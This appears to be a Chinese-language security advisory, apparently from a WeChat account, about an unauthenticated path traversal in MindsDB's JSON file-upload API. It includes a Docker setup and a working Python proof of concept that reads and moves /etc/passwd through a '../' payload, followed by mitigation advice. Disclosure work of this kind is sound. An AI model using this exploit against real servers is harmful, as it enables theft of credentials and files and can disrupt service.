---
title: MindsDB 文件路径处理漏洞预警：未授权信息泄露与拒绝服务风险
url: https://mp.weixin.qq.com/s/m26ce6CYk87l-xBxr4MJ3w
source: Doonsec's feed
date: 2026-01-24
fetch_date: 2026-01-25T03:53:48.141858
---

# MindsDB 文件路径处理漏洞预警：未授权信息泄露与拒绝服务风险

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/0HlywncJbB1aKxPaJNIlQmnYdovumGzyt6bYUicJ4qNibG305dU4vRS5rnibibbRicP8USKETKWKyq3pFLickfSfT25Q/0?wx_fmt=jpeg)

# MindsDB 文件路径处理漏洞预警：未授权信息泄露与拒绝服务风险

原创

TT
TT

TtTeam

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_png/0HlywncJbB1aKxPaJNIlQmnYdovumGzyqibM24kBuTZ9R95UrRlFgE2xhmkX37ScbGjhdicgaiav9Nh0EExiaxAXAA/640?wx_fmt=png&from=appmsg)

**漏洞等级**：高危（High）

**影响范围**：MindsDB 相关版本（含最新版，基于漏洞复现环境验证）

**核心风险**：未授权攻击者可通过文件上传 API 实现路径遍历，读取服务器任意文件并移入 MindsDB 存储目录，导致敏感信息泄露；文件被移动还可能引发服务器服务异常（DOS）

## 一、漏洞概述

##

MindsDB 的文件上传 API 存在未授权路径遍历漏洞。攻击者无需认证，即可利用该漏洞读取服务器文件系统中的任意文件，并将其移动至 MindsDB 的管理存储目录。这一漏洞直接导致服务器敏感数据暴露，同时文件的非正常迁移可能破坏服务器正常运行环境，引发拒绝服务问题。

## 二、漏洞细节

##

漏洞根源在于 file.py 文件中的 PUT 处理函数存在路径清理缺失问题。当请求体为 JSON 格式且 source\_type 不为 "url" 时，程序会将用户可控数据直接拼接为文件系统路径，具体流程如下：

1. 程序在第 104 行左右通过 `data = request.json` 接收攻击者输入，未对输入数据进行任何有效性验证；
2. 第 178 行左右通过 `file_path = os.path.join(temp_dir_path, data["file"])` 在临时目录内构造文件路径。但如果攻击者在 data["file"] 中传入绝对路径（例如 /home/secret.csv），os.path.join 函数会忽略预设的 temp\_dir\_path，直接定位到攻击者指定的路径；
3. 构造后的路径会传递给 ca.file\_controller.save\_file(...) 函数，该函数在 mindsdb/interfaces/file/file\_controller.py 的第 66 行通过 FileReader(path=source\_path) 读取指定路径文件的内容。后续的 shutil.move(file\_path, ...) 调用会将目标文件迁移至 MindsDB 的管理存储目录；
4. 关键问题：分片上传（multipart uploads）和 URL 源上传（URL-sourced uploads）均有文件名清理（clear\_filename）或等效校验机制，而 JSON 格式上传完全缺失该类防护措施。

## 三、漏洞复现（PoC）

##

以下复现步骤基于 Docker 环境，可快速验证漏洞存在性：

### 1. 部署漏洞环境

拉取并运行最新版 MindsDB 容器：

```
```
docker pull mindsdb/mindsdb:latestdocker run --rm -it -p 47334:47334 --name mindsdb-poc mindsdb/mindsdb:latest
```
```

### 2. 执行漏洞利用脚本

在主机端创建 poc.py 文件，写入以下代码并通过 Python 执行：

```
```
# poc.pyimport requests, jsonbase = "http://127.0.0.1:47334"# 未指定 source_type，触发漏洞代码分支，通过相对路径遍历读取 /etc/passwdpayload = {"file": "../../../../../etc/passwd"}  r = requests.put(f"{base}/api/files/leak_rel", json=payload, timeout=10)print("PUT status:", r.status_code, r.text)q = requests.post(    f"{base}/api/sql/query",    json={"query": "SELECT * FROM files.leak_rel"},    timeout=10,)print("SQL response:", json.dumps(q.json(), indent=2))
```
```

### 3. 复现结果

执行脚本后，SQL 响应会返回 /etc/passwd 文件的完整内容。同时，原 /etc/passwd 文件会从源位置消失，被迁移至 MindsDB 的存储目录中。

## 四、漏洞影响

##

任何能够访问 MindsDB REST API 的攻击者，均可读取并窃取 MindsDB 进程有权限访问的所有文件，潜在泄露的敏感信息包括但不限于：

* 服务器数据库凭证、API 密钥等认证信息；
* MindsDB 及其他应用的配置文件、密钥文件；
* 服务器系统文件、用户数据等私密信息。

此外，核心系统文件（如 /etc/passwd、配置文件）被迁移后，可能导致服务器或 MindsDB 服务异常中断，引发拒绝服务（DOS）后果。

## 五、临时防护建议

##

目前官方尚未发布修复补丁，建议相关用户采取以下临时措施降低风险：

1. 限制 MindsDB REST API 的访问范围，仅允许可信IP访问 47334 端口，禁止公网暴露；
2. 临时禁用 JSON 格式的文件上传功能，仅保留分片上传或 URL 源上传方式；
3. 对 file.py 文件的 PUT 处理函数进行紧急修复，为 JSON 格式上传添加文件名校验逻辑，调用 clear\_filename 函数清理用户输入的文件路径，拒绝绝对路径和包含 ../、../../ 等遍历字符的输入；
4. 降低 MindsDB 进程的运行权限，避免使用 root 或高权限用户启动服务，限制其对系统敏感文件的访问权限。

## 六、后续关注

##

建议用户密切关注 MindsDB 官方更新，及时下载安装包含漏洞修复的版本。若发现疑似攻击行为，需立即检查服务器文件完整性、敏感信息泄露情况，并采取应急响应措施。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/0HlywncJbB32jygJerkpmJzM0Q4aia2A7YtEsw27852R0p5Henwz2TJL8iczQ5cPQm7y1Y6oM9dQocgyjsqO5VBg/0?wx_fmt=png)

TtTeam

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/0HlywncJbB32jygJerkpmJzM0Q4aia2A7YtEsw27852R0p5Henwz2TJL8iczQ5cPQm7y1Y6oM9dQocgyjsqO5VBg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过